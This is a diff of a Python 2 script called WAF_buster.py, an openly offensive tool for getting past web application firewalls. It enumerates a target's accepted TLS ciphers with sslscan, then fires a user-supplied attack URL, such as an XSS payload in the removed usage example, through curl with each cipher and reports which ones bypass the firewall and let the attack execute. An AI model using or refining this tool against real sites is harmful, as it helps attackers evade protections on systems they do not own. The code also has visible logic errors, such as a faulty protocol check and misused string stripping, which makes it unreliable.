@@ -1,75 +1,106 @@
 #!/usr/bin/python2
+
 import sys
-import subprocess
+import subprocess 
 import requests as re
 import os
 
 def banner():
-	print "[1]Please Enter the Domain name on which WAF is set Up......"
-	print "[2]Plese enter the second parameter as payload URL ......"
-	print "[*]For eg:- ./WAF_buster.py abc.com abc.com/<script>alert(9)</script> //Please Mention http or https//....."
+	print "[*]Usage: python WAF_buster.py --input"
 	print "[*]Run this script only if the Payload_URL is getting blocked by firewall "
-def check_response():
-	global g
-	f=re.get(sys.argv[1])
-	g=f.status_code
-	print g
-def ssl_check(domain,payload):
-  	os.system('touch file.txt')
-	file1=subprocess.Popen(["sslscan",domain],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-	output1,error1=file1.communicate()
-	open_file=open("file.txt",'w')
-	open_file.write(output1)
-	open_file.close()
-	file_open=open("file.txt",'r')
-	for line in file_open.readlines():
-                if "Accepted" or "Preferred" in line:
-                        os.system('touch cipher.txt')
-                        file_write=open("cipher.txt",'w')
-                        file_write.write(line)
-                else:
-                        continue
-        file_write.close()
-	file_open.close()
 
-        fi= open("final_cipher.txt",'w')
-	fm=open("cipher.txt",'r')
-        for line in fm.readlines():
-                line=line.split(' ')
-                if len(line)==5:
-                        del line[0]
-                        del line[1]
-                        del line[2]
-                        del line[3]
-                        del line[5]
-                	fi.write(line[4]+"\n")
-                else:
-                        print "file Incomplete"
-	fm.close()
-        fi.close()
-        
-        try:
-		cipher_open=open("final_cipher.txt",'r')
-                for i in cipher_open.readlines():
-                	file2=subprocess.Popen(["curl","--ciphers",i,payload],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-                	output2,error2=file2.communicate()
-                        if g in output2:
-                        	print "Firewall blocked Cipher %s" %i
-                        elif payload in output2:
-                        	print "Firewall Bypassed using Cipher :%s and attack executed" %i
-                        else:
-                                print "firewall Bypassed using Cipher %s but attack blocked" %i
-                cipher_open.close()
-        except Exception as ex:
-        	print ex
+def check_response(argument):
+        f=re.get(argument)
+        g=f.status_code
+	return g
+
+def ssl_check(Domain,Site_Payload,Payload):
+	file1=subprocess.Popen(["sslscan",Domain],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	output1,error1=file1.communicate()
+	if "Could not resolve hostname" in output1:
+		print "Some issues occured , Please Try Again !!!"
+		main()
+	else:
+		open_file=open("file.txt",'w')
+		open_file.write(output1)
+		open_file.close()
+
+		file_open=open("file.txt",'r')
+		file22=open("cipher.txt",'w')
+	
+		for line in file_open:
+                	if "Accepted" in line or "Preferred" in line:
+                        	file22.write(line)
+                	else:
+                        	continue
+
+		file22.close()
+		file_open.close()
+
+        	fi= open("escape_char_cipher.txt",'w')
+		fm=open("cipher.txt",'r')
+
+        	for line in fm:
+			line=line.split(' ')
+                	if len(line)<6:
+				continue
+			elif "Accepted" in line[0]:
+				line=line[7]
+				fi.write(line+"\n")
+			else:
+                		line=line[6]
+				fi.write(line+"\n")
+		fm.close()
+        	fi.close()
+	
+		T1=open("escape_char_cipher.txt",'r')
+		T2=open("final_cipher.txt",'w')
+
+		for i in T1:
+			if "32m" in i:
+				i=i.lstrip("\x1b[32m")
+				T2.write(i)
+			elif "33m" in i:
+				i=i.lstrip("\x1b[32m")
+				T2.write(i)
+			else:
+				T2.write(i)
+		T1.close()
+		T2.close()
+
+        	try:
+			cipher_open=open("final_cipher.txt",'r')
+                	for i in cipher_open:
+                		file2=subprocess.Popen(["curl","--ciphers",i,Site_Payload],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+                		output2,error2=file2.communicate()
+				request=str(check_response(Site_Payload))
+                        	if request in output2:
+                        		print "\n\033[32mFirewall blocked Cipher %s\033[0m" %i
+                        	elif Payload in output2:
+                        		print "\n\033[32mFirewall Bypassed using Cipher:%s\033[0m" %i
+					print "And attack executed"
+                        	else:
+                         	        print "\n\033[32mFirewall Bypassed using Cipher:%s\033[0m" %i
+					print "But attack blocked"
+                	cipher_open.close()
+        	except Exception as ex:
+        		print ex 
 	
 def main():
-	if len(sys.argv)<3:
+	if len(sys.argv)<2:
+		banner()
+	elif sys.argv[1]!= "--input":
 		banner()
 	else:
-		domain=sys.argv[1]
-		payload=sys.argv[2]
-		ssl_check(domain,payload)
+		Domain=raw_input("[1] Enter The Domain Or Subdomain with http:// or https://:\t")
+		if "http" not in Domain or "https" not in Domain:
+			print "Please Specify the protocol Schema"
+			main()
+		Site_Payload=raw_input("[2] Enter The Domain Or Subdomain alongwith the Payload:\t")
+		if "http" not in Domain or "https" not in Domain:
+			print "Please Specify the protocol Schema"
+			main()
+		Payload=raw_input("[3] Enter the Payload:\t")
+		ssl_check(Domain,Site_Payload,Payload)
 main()
-
 
